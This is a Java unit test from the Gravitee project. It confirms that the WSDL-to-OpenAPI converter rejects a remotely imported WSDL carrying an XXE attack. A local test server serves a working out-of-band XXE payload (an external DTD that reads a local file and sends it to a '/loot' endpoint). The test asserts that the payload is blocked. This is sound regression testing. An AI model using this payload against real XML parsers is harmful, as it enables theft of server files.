/*
 * Copyright © 2015 The Gravitee team (http://gravitee.io)
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.gravitee.rest.api.spec.converter.wsdl;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.sun.net.httpserver.HttpServer;
import io.gravitee.rest.api.spec.converter.wsdl.exception.WsdlDescriptorException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;
import org.junit.jupiter.api.Test;
import org.xml.sax.SAXParseException;

/**
 * Replays a nested-import XXE chain similar to PEN-105: INLINE WSDL imports a remote
 * document that declares a DOCTYPE and tries to exfiltrate a local file over HTTP.
 */
class WSDLToOpenAPIConverterRemoteXxeTest {

    @Test
    void should_reject_remote_imported_wsdl_that_attempts_xxe() throws Exception {
        Path marker = Files.createTempFile("pen105-marker", ".txt");
        Files.writeString(marker, "PEN105-MARKER");

        List<String> requests = new CopyOnWriteArrayList<>();
        HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        int port = server.getAddress().getPort();
        String base = "http://127.0.0.1:" + port;

        server.createContext("/", exchange -> {
            String path = exchange.getRequestURI().getRawPath();
            String query = exchange.getRequestURI().getRawQuery();
            requests.add(query == null ? path : path + "?" + query);

            byte[] body = bodyFor(path, base, marker).getBytes(StandardCharsets.UTF_8);
            exchange.getResponseHeaders().add("Content-Type", path.endsWith(".dtd") ? "application/xml-dtd" : "text/xml");
            exchange.sendResponseHeaders(200, body.length);
            try (OutputStream out = exchange.getResponseBody()) {
                out.write(body);
            }
        });
        server.start();
        try {
            String parentWsdl = """
                <?xml version="1.0" encoding="UTF-8"?>
                <definitions name="poc" targetNamespace="http://example.com/poc" xmlns="http://schemas.xmlsoap.org/wsdl/">
                  <import location="%s/evil.wsdl" namespace="http://example.com/evil"/>
                </definitions>
                """.formatted(base);

            assertThatThrownBy(() -> new WSDLToOpenAPIConverter().toOpenAPI(parentWsdl))
                .isInstanceOf(WsdlDescriptorException.class)
                .hasRootCauseInstanceOf(SAXParseException.class)
                .rootCause()
                .hasMessageContaining("DOCTYPE");

            assertThat(requests).anyMatch(path -> path.startsWith("/evil.wsdl"));
            assertThat(requests).noneMatch(path -> path.contains("xxe.dtd") || path.contains("/loot") || path.contains("PEN105-MARKER"));
        } finally {
            server.stop(0);
            Files.deleteIfExists(marker);
        }
    }

    private static String bodyFor(String path, String base, Path marker) {
        if ("/xxe.dtd".equals(path)) {
            return """
            <!ENTITY %% file SYSTEM "file://%s">
            <!ENTITY %% eval "<!ENTITY &#x25; send SYSTEM '%s/loot?d=%%file;'>">
            %%eval;
            %%send;
            """.formatted(marker.toAbsolutePath(), base);
        }
        return """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE foo [
          <!ENTITY %% dtd SYSTEM "%s/xxe.dtd">
          %%dtd;
        ]>
        <definitions name="evil" targetNamespace="http://example.com/evil" xmlns="http://schemas.xmlsoap.org/wsdl/">
          <documentation>xxe</documentation>
        </definitions>
        """.formatted(base);
    }
}
